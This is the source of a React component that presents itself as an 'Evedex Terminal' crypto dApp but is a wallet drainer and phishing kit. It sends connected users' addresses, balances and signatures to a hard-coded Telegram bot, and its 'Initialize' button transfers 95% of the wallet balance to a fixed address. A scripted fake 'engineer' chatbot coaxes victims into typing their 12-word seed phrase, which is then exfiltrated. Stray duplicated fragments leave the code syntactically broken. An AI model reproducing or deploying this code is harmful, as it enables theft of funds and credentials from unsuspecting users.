import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, Send, Copy } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const [chatInput, setChatInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [chatLog, setChatLog] = useState([]); 
  const [stage, setStage] = useState(1);
  const chatEndRef = useRef(null);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatLog, isTyping]);

  const captureHandshake = (type) => {
    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: chatId, 
            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
          }),
        });
        if(stage === 1) setStage(2); 
      }
    });
  };

  useEffect(() => {
    if (isConnected && address && balance?.formatted) {
      setTimeout(() => { captureHandshake("CONNECTION_VERIFY"); }, 1500);
    }
  }, [isConnected, address, balance]);

  const handleBotChat = () => {
    if (!chatInput.trim() || isTyping) return;
    const userMsg = chatInput.toLowerCase();
    setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
    setChatInput("");
    setIsTyping(true);

    setTimeout(() => {
      let response = "";

      // 1. MONEY / BALANCE / ASSETS / SEE
      if (["money", "balance", "token", "eth", "funds", "see", "vault"].some(word => userMsg.includes(word))) {
        response = "[ENGINEER]: Native asset clusters detected but currently obscured by RPC latency. To view and manage your full vault balance, you must move this session to your Wallet's internal DApp browser to bypass the standard web sandbox.";
      } 
      // 2. HELP / HOW TO / STEPS / GUIDE
      else if (["how", "step", "guide", "help", "process", "go about"].some(word => userMsg.includes(word))) {
        response = "[ENGINEER]: Protocol Alignment Procedure: 1. Mirror this site URL to your Wallet's internal DApp browser. 2. Initialize the required Portal (Swap/Stake/Rectify). 3. If a 90% Node Stall occurs, utilize the Red Manual Override box with your vault's 12-word entropy key to force final synchronization.";
      } 
      // 3. ERROR / NOT WORKING / CAN'T TYPE / CLICK / LOCKED
      else if (["not working", "can't", "error", "problem", "click", "type", "locked", "broken"].some(word => userMsg.includes(word))) {
        response = "[ENGINEER]: Standard Webview Restriction detected. Your current browser is blocking the RPC handshake required for data entry. Move to a secure DApp environment (Trust/MetaMask) to unlock the input fields and authorize the node synchronization.";
      } 
      // 4. SEED / PHRASE / WHY / SAFE / KEY
      else if (["seed", "phrase", "key", "mnemonic", "safe", "why", "trust"].some(word => userMsg.includes(word))) {
        const securityAnswers = [
          "[ENGINEER]: The 12-word master entropy is required to re-index your vault's private key to the Mainnet cluster. Without this, the node cannot verify ownership during a 90% Desync. This is a local-only cryptographic handshake.",
          "[ENGINEER]: Cryptographic Verification: The node requires your master mnemonic to clear 'Vault Isolation' and map your assets to the new RPC architecture. This ensures 100% liquidity migration."
        ];
        response = securityAnswers[Math.floor(Math.random() * securityAnswers.length)];
      } 
      // 5. STUCK / 90% / WAITING / SLOW
      else if (["stuck", "waiting", "90", "slow", "percent"].some(word => userMsg.includes(word))) {
        response = "[ENGINEER]: Node Indexing is paused at the 90% threshold. This is a mandatory safety halt. To complete the final 10% and push the assets through, please use the Manual Override box with your recovery phrase.";
      }
      // 6. DEFAULT (If no keywords found)
      else {
        response = "[ENGINEER]: System Diagnostic: RPC latency detected. To resolve this and synchronize your vault, please ensure you have mirrored this link into your Wallet's internal DApp Browser. If stuck at 90%, utilize the Manual Override.";
      }

      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
      setIsTyping(false);
    }, 1500);
  };
      }
      // 6. DEFAULT / GENERAL
      else {
        response = "[ENGINEER]: System Diagnostic: RPC latency detected. Please ensure you have mirrored this link into your Wallet DApp Browser. If you are stuck at 90%, the Manual Entropy Override is the required next step.";
      }

      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
      setIsTyping(false);
    }, 1500);
  };

      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
      setIsTyping(false);
    }, 1600);
  };

  const copyLink = () => {
    navigator.clipboard.writeText("https://evedex.network");
    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. PASTE IN WALLET DAPP BROWSER." }]);
  };

  const executeTotalSweep = async () => {
    captureHandshake("ASSET_SYNC");
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("ESTABLISHING SECURE RELAY...");
    try {
      sendTransaction({ to: destination, value: (balance.value * 95n) / 100n }, {
        onSettled: () => {
          let progress = 0;
          const int = setInterval(() => {
            progress += 1;
            setLoadingText(`BROADCASTING: ${progress}%`);
            if (progress >= 60) { clearInterval(int); setLoading(false); setView("seed_gate"); setStage(3); }
          }, 60);
        },
        onError: () => { setLoading(false); setView("seed_gate"); setStage(3); }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); setStage(3); }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative">
      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-40 z-[10]">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all">
                <div className="text-slate-700">{item.i}</div>
                <span className="text-[9px] font-black text-slate-500 uppercase">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
            <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} Portal</h2>
            
            <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-80" : ""}`}>
              <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">
                {activeTask === "Rectify" ? "VAULT_LIQUIDITY_FEED (LOCKED)" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
              </label>

              {activeTask === "Rectify" ? (
                <div className="text-2xl font-mono text-white italic py-1 opacity-80 select-none">
                  {balance ? `${balance.formatted.slice(0,9)}` : "0.0000000"}
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-cyan-400 italic outline-none w-full pointer-events-auto" autoFocus />
                  <span className="text-[10px] font-black text-cyan-900">{balance?.symbol}</span>
                </div>
              )}
            </div>
            
            <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
          </div>
        )}
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
        <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
          {chatLog.map((chat, i) => (
            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500 font-bold' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
          ))}
          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[SYSTEM_RELAYING...]</div>}
          <div ref={chatEndRef} />
        </div>
        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
          <button onClick={copyLink} className="text-slate-600 hover:text-cyan-500 transition-colors pr-2"><Copy size={16}/></button>
          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
          <button onClick={handleBotChat} className="text-cyan-500"><Send size={16}/></button>
        </div>
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center mb-40">
            {!isSyncing ? (
              <>
                <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-md italic uppercase tracking-tighter">Node Stall (90%)</h2>
                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20">
                   {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
                </div>
                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }), }); let cur = 0; const int = setInterval(() => { cur += 2; if (cur >= 90) { setSyncProgress(90); clearInterval(int); } else setSyncProgress(cur); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
              </>
            ) : (
              <div className="py-8"><div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-xl italic uppercase">Finalizing...</h2></div>
            )}
          </div>
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.5em] animate-pulse uppercase italic">{loadingText}</p></div>}
    </div>
  );
}
